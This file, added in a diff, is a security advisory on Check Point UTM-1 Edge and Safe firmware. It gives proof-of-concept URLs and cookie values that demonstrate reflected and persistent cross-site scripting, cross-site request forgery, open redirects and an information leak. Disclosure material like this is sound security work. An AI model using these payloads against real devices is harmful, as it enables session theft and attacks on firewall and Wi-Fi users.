@@ -1,0 +1,75 @@
+source: http://www.securityfocus.com/bid/50189/info
+
+Check Point UTM-1 Edge and Safe are prone to multiple security vulnerabilities, including:
+
+1. Multiple cross-site scripting vulnerabilities
+2. Multiple HTML-injection vulnerabilities
+3. Multiple cross-site request forgery vulnerabilities
+4. Multiple URI-redirection vulnerabilities
+5. An information-disclosure vulnerability
+
+An attacker may leverage these issues to access sensitive information, redirect an unsuspecting victim to an attacker-controlled site, or steal cookie-based authentication credentials, to perform unauthorized actions in the context of a user's session.
+
+Versions prior to Check Point UTM-1 Edge and Safe 8.2.44 are vulnerable. 
+
+Tested on versions 7.5.48x, 8.1.46x and 8.2.2x.
+
+
+1) The following demonstrate the reflective XSS flaws:-
+
+a) The Ufp.html page is vulnerable to XSS via the url parameter
+It works by submitting a malicious url parameter to the ufp.html page
+http://www.example.com/pub/ufp.html?url=";><script>alert(1)</script>&mask=000&swpreview=1
+
+This works with firmware versions 7.5.48x, 8.1.46x and 8.2.2x.
+
+b) The login page is also vulnerable to an XSS via the malicious session cookie
+It works by submitting a malicious session cookie to the login page
+Cookie: session="><script>alert(1)</script>
+
+c) An authenticated XSS exists within the diagnostics command
+http://www.example.com/diag_command.html?sw__ver=blah1&swdata=blah2&sw__custom='";);alert(1);//
+(this might need to be submitted twice)
+
+
+2) The following demonstrate the persistent XSS flaws and XSRF flaws:-
+
+a) The blocked URL warning page is vulnerable to a persistent XSS attack placing any internal users at risk of attack 
+when the page is displayed.
+
+First an attacker has to trick the administrator to follow a XSRF attack; the (swsessioncookie) session cookie for 
+simplicity sake is shown though JavaScript document.cookie can be used to subvert this protection (see paper).
+http://www.example.com/UfpBlock.html?swcaller=UfpBlock.html&swsessioncookie=20KHYp5-oS7rKmS-a4rq4j&swsave=1&ufpblockhttps=0&ufpbreakframe=&backurl=WebRules.html&ufpblockterms=%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+
+Firewall users then visiting blocked sites will have the blocked page displayed and the attack carried out.
+http://www.example.com/pub/ufp.html?url=www.blockedUrl.com&mask=000&swpreview=1
+
+b) The Wi-Fi hotspot landing page on Wi-Fi enabled firewalls is also vulnerable, with any user using the Wi-Fi access 
+point being at risk.
+
+First an attacker has to trick the administrator to follow a XSRF attack, the (swsessioncookie) session cookie for 
+simplicity sake is shown though JavaScript document.cookie can be used to subvert this protection (see paper).
+http://www.example.com/HotSpot.html?swcaller=HotSpot.html&swsessioncookie=20KHYp5-oS7rKmS-a4rq4j&swsave=1&hotspotnets=00000000000000000000000000000000000000&hotspotpass=1&hotspotmulti=1&hotspothttps=0&hotspotnet1=0&hotspotnet2=0&hotspotnet3=0&hotspotenf=0&hotspottitle=Welcome+to+My+HotSpot&hotspotterms=%22%3E%3Cscript%3Ealert%282%29%3C%2Fscript%3E&thotspotpass=on&thotspotmulti=on
+
+Firewall users then visiting the Wi-Fi landing page will then have the attack carried out.
+http://www.example.com/pub/hotspot.html?swpreview=1
+
+
+3) The following demonstrate the (authenticated) offsite redirection flaws:-
+
+a) Enter the following URL to redirect
+http://www.example.com/12?swcaller=http://www.procheckup.com
+
+b) Enter the following URL and then press back button.
+http://www.example.com/UfpBlock.html?backurl=http://www.procheckup.com
+
+4) The following demonstrate the Information disclosure flaws (no authentication needed)
+It was found that the /pub/test.html program disclosed information, regarding the patch level used, licensing and the 
+MAC addresses to unauthenticated users.
+
+a) On early firmware versions 5.0.82x, 6.0.72x & 7.0.27x 7.5.48x
+Just requesting http:// www.example.com/pub/test.html is sufficient
+
+b) However this no longer worked on versions 8.1.46x & 8.2.26x however adding the URL parameter and a double quote 
+bypassed this check
+https:// www.example.com/pub/test.html?url="
